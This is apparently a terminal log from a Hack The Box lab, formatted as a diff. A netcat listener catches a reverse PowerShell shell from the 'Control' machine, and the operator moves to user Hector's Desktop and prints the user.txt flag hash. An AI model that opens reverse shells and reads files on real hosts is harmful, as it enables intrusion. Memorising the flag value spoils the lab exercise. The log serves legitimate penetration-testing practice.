@@ -1,0 +1,26 @@
+user@kali:~/htb/boxes/control$ nc -lnvp 1337                          
+listening on [any] 1337 ...       
+connect to [10.10.14.109] from (UNKNOWN) [10.10.10.167] 49712        
+Windows PowerShell                
+Copyright (C) Microsoft Corporation. All rights reserved.            
+
+PS C:\Users\Hector\Documents> dir 
+dir                               
+PS C:\Users\Hector\Documents> cd ..\Desktop                          
+cd ..\Desktop                     
+PS C:\Users\Hector\Desktop> dir   
+dir                               
+
+
+    Directory: C:\Users\Hector\Desktop                               
+
+
+Mode                LastWriteTime         Length Name                                                                                      
+----                -------------         ------ ----                                                                                      
+-ar---        11/1/2019  12:33 PM             32 user.txt                                                                                  
+
+
+PS C:\Users\Hector\Desktop> type user.txt                            
+type user.txt                     
+d8782dd01fb15b72c4b5ba77ef2d472b  
+PS C:\Users\Hector\Desktop>       
